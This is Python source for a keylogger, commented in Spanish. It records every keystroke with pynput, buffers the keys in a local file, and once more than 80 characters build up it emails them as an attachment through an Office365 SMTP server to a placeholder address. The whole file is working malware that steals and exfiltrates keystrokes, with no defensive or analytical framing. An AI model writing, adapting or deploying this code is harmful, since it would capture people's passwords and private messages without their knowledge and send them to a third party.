from pynput.keyboard import Listener 
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import smtplib
from threading import Thread

def captura(key):
    # Convierte la tecla en un string.
    tecla = str(key)
    # Remplaza las comillas simples por una cadena vacia.
    tecla = tecla.replace("'", "")
    # imprime en pantalla la tecla pulsada.
    print(tecla)
    # Comprueba si la tecla pulsada es la de escape y si lo es, sale del programa.
    if tecla == "Key.esc":
        sys.exit()
    # Reemplaza la tecla Key.space por un espacio.
    if tecla == "Key.space":
        tecla = " " 
    # Reemplaza la tecla Key.enter por [ENTER] y con un espacio.
    if tecla == "Key.enter":
        tecla = " [ENTER] "
    # Abre un archivo llamado log y escribe en él las teclas pulsadas.
    file = open("log", "a")
    file.write(tecla)
    file.close()
    # Abre un archivo llamado log y lee el contenido.
    file = open("log", "r")
    data=file.read()
    file.close()
    # Si el archivo tiene mas 80 caracteres envia el correo.
    if len(data)>80:
        # Crea un segundo archivo para enviar y no interrumpir el guardado del primero.
        fil=open("send","a")
        fil.write(data)
        # Abre el archivo log para borrar todo su contenido.
        file = open("log", "w")
        file.write("")
        file.close()
        # Envia el correo
        env=Thread(target=enviar)
        env.start()

def enviar(): 
    # Creación de un objeto MIME.
    msg = MIMEMultipart("plain")
    # La dirrección de correo electrónico del remitente.
    msg["From"]="CorreoFrom@outlook.com"
    # La dirrección de correo electrónico del destinatario.
    msg["To"]= "CorreoTo@hotmail.com"
    # Establecer el asunto del correo electrónico.
    msg["Subject"]="Correo de Prueba"
    # Creación de un objeto MIME.
    adjunto = MIMEBase("aplication", "octect-stream")
    # Leer el archivo "send" y ajustar la carga útil al contenido del archivo.
    adjunto.set_payload(open("send","r").read())
    # Agregar un encabezado al archivo.
    adjunto.add_header("content-Disposition", 'attachment; filename="mensaje.txt"')
    # Adjuntar el archivo al correo electrónico.
    msg.attach(adjunto)
    # Conexión al servidor SMTP.
    smtp = smtplib.SMTP("smtp.office365.com:587")
    # Método utilzado para iniciar una sesión TLS (Transport Layer Segurity) con el servidor SMTP.
    smtp.starttls()
    # Entrar en el servidor SMTP.
    smtp.login("CorreoFrom@outlook.com","Password")
    # Envío del correo electrónico.
    smtp.sendmail("CorreoFrom@outlook.com","CorreoTo@hotmail.com",msg.as_string())
    # Cerrar la conexión con el servidor SMTP.
    smtp.quit()
# Escucha las pulsaciones del teclado y cuando se pulsa una tecla llama a la función captura.
with Listener(on_press=captura) as Listen:
    Listen.join()
